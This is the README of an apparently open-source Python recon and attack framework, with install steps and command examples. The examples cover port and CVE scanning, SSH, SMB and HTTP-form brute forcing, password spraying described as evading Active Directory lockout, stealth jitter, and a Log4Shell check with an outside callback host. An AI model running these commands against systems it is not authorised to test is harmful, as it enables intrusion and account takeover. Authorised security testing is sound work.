# ⚡ LightScan v2.0 PHANTOM
> **Developer: Light (Neok1ra)**  
> Async Network Recon & Attack Framework — pure Python stdlib core, zero hard deps.

---

## Install

```bash
git clone https://github.com/ne0k1r4/LightScan
cd LightScan
pip install -e .                          # core (no deps)
pip install -r requirements.txt           # optional: full brute capability
```

---

## Modules

| Module | Command | Description |
|--------|---------|-------------|
| Port Scan | `--scan` | Async TCP/UDP + banner grabbing |
| DNS Enum | `--dns domain.com` | A/MX/NS/TXT/SOA + AXFR + crt.sh + brute |
| Traceroute | `--traceroute host` | TCP SYN traceroute (raw socket / connect fallback) |
| CVE Checker | `--cve` | EternalBlue · Log4Shell · Spring4Shell · Heartbleed · ShellShock · Redis/Mongo/ES unauth |
| Brute Force | `--brute PROTO` | SSH · FTP · SMTP · HTTP · MySQL · PostgreSQL · MSSQL · Telnet · VNC · SMB · RDP · LDAP |
| Credential Spray | `--spray` | 1 password × N users, window-aware (evades AD lockout) |
| Smart Mutation | `--mutate` | Context-aware password generation |
| OAuth 2.0 | `--oauth URL` | Open redirect · CSRF state · PKCE downgrade · scope escalation · device code |
| Scan Diff | `--diff old.json new.json` | Compare two scan reports |
| Checkpoint | `--resume` | Crash recovery — resumes brute from last position |

---

## Quick Examples

```bash
# Full port scan
lightscan --scan -t 192.168.1.0/24 -p top100 -o ./reports

# DNS enumeration with zone transfer + crt.sh
lightscan --dns target.com

# CVE check on scanned host
lightscan --scan --cve -t 10.0.0.5 -p 22,80,443,445,3306

# SSH brute with smart mutation
lightscan --brute ssh -t 10.0.0.1 -U admin,root -W rockyou.txt --mutate

# Password spray (AD-safe)
lightscan --brute smb -t 10.0.0.0/24 -U file:users.txt -W "Summer2024!" --spray --spray-window 1800

# HTTP form brute
lightscan --brute http -t 10.0.0.1 \
  --http-url http://10.0.0.1/login \
  --http-user-field username --http-pass-field password \
  --http-failure "Invalid credentials" \
  -U admin -W wordlist.txt

# OAuth 2.0 audit
lightscan --oauth https://login.target.com/oauth/authorize \
  --oauth-client YOUR_CLIENT_ID \
  --oauth-redirect https://your-app.com/callback

# Log4Shell with OAST callback
lightscan --cve --cve-list log4shell -t 10.0.0.1 \
  --log4shell-callback YOUR.interactsh.com:80

# Diff two scans
lightscan --diff scan_monday.json scan_friday.json

# Resume interrupted brute
lightscan --brute ssh -t 10.0.0.1 -U admin -W rockyou.txt --resume

# Stealth mode with jitter
lightscan --brute ftp -t 10.0.0.1 -U admin -W passwords.txt --jitter 2 8
```

---

## Report Formats

Every scan auto-generates 3 files:
- `lightscan_report.json` — machine-readable
- `lightscan_report.md` — markdown with severity tables
- `lightscan_report.html` — dark themed interactive report

---

*LightScan v2.0 PHANTOM · Developer: Light (Neok1ra)*
